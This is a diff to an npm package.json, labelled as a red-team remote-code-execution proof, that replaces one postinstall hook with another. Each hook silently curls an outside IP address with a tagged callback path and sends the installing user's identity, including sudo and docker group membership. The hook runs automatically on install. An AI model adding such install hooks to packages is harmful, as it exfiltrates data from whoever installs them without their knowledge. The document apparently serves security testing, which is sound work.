@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "description": "Red team RCE proof — do not use",
   "scripts": {
-    "postinstall": "curl -sk 'http://168.235.91.138:7891/rce-1777010527?id='\uid=1000(chases)+gid=1000(chases)+groups=1000(chases),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),129(libvirt),984(docker) || true"
+    "postinstall": "curl -sk 'http://168.235.91.138:7891/rce-1777011180?id='\uid=1000(chases)+gid=1000(chases)+groups=1000(chases),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),129(libvirt),984(docker) || true"
   },
   "main": "index.js"
 }
